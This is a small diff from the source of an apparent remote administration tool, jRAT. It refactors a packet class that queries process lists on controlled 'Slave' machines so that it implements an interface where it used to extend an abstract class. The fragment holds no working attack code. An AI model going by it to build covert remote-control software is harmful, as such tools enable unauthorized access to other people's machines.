@@ -1,10 +1,10 @@
 package jrat.module.process;
 
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.AbstractOutgoingPacket;
+import jrat.controller.packets.outgoing.OutgoingPacket;
 
 
-public class PacketQueryProcesses extends AbstractOutgoingPacket {
+public class PacketQueryProcesses implements OutgoingPacket {
 	
 	private boolean icons;
 	
